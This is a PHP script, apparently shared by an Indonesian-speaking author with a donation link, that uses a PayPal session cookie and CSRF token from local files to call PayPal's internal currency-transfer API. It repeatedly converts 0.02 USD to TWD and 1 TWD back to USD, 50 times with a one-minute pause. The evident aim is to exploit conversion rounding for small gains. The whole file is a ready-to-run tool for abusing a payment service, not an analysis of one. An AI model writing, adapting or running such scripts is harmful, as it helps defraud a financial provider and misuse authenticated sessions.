<?php
error_reporting(0);
function getStr($string, $start, $end)
{
        $str = explode($start, $string);
        $str = explode($end, ($str[1]));
        return $str[0];
}

function warna($text, $warna)
{
        $warna = strtoupper($warna);
        $list = array();
        $list['BLACK'] = "\033[30m";
        $list['RED'] = "\033[31m";
        $list['GREEN'] = "\033[32m";
        $list['YELLOW'] = "\033[33m";
        $list['BLUE'] = "\033[34m";
        $list['MAGENTA'] = "\033[35m";
        $list['CYAN'] = "\033[36m";
        $list['WHITE'] = "\033[37m";
        $list['RESET'] = "\033[39m";
        $warna = $list[$warna];
        $reset = $list['RESET'];
        if (in_array($warna, $list)) {
                $text = "$warna$text$reset";
        } else {
                $text = $text;
        }
        return $text;
}
function usd_to_twd($cookie, $csrf, $user)
{
        $arr = array("\r", "	");
        $url = "https://www.paypal.com/myaccount/money/api/currencies/transfer";
        $h = explode("\n", str_replace($arr, "", "Cookie: $cookie
	Content-Type: application/json
	user-agent: $user"));
        $body = "{\"sourceCurrency\":\"USD\",\"sourceAmount\":0.02,\"targetCurrency\":\"TWD\",\"_csrf\":\"$csrf\"}";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $x = curl_exec($ch);
        curl_close($ch);
        return json_decode($x, true);
}





function twd_to_usd($cookie, $csrf, $user)
{
        $arr = array("\r", "	");
        $url = "https://www.paypal.com/myaccount/money/api/currencies/transfer";
        $h = explode("\n", str_replace($arr, "", "Cookie: $cookie
	Content-Type: application/json
	user-agent: $user"));
        $body = "{\"sourceCurrency\":\"TWD\",\"sourceAmount\":1,\"targetCurrency\":\"USD\",\"_csrf\":\"$csrf\"}";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $x = curl_exec($ch);
        curl_close($ch);
        return json_decode($x, true);
}


echo warna("\nJangan Lupa Makan Gan\nDonasi : paypal.me/sirhuka\nThank You . .\n\n ", "cyan");

$file = file_get_contents("cookie.txt");
$cookie = $file;
$csrf = file_get_contents("csrf.txt");
$csrf = str_replace("\"", "", $csrf);

$user = file_get_contents("user-agent.txt");
for ($x = 1; $x <= 50; $x++) {
        echo "\n\nPercobaan Ke $x : \n";
        $jpy_to_twd =  usd_to_twd($cookie, $csrf, $user);
        $output_send_jpy_twd = json_encode($jpy_to_twd);
        $amount = getStr($output_send_jpy_twd, '"value":"', '"');
        if (strpos($output_send_jpy_twd, "null") == true) {
                $text3 = warna(" -Berhasil convert Ke TWD", "green");
                echo  $text3 . "\n";
                $twd_to_usd =  twd_to_usd($cookie, $csrf, $user);
                $twd_to_usd = json_encode($twd_to_usd);
                $amount = getStr($twd_to_usd, '"value":"', '"');

                if (strpos($twd_to_usd, "null") == true) {
                        $text3 = warna(" -Berhasil convert Ke USD", "green");
                        echo $text3 . "\n";
                } else {
                        $text4 = "Gagal Convert";
                        echo $text4 . "\n";
                }
        } else {
                $text4 = "Gagal Convert";
                echo $text4 . "\n";
        }
        sleep(60);
}
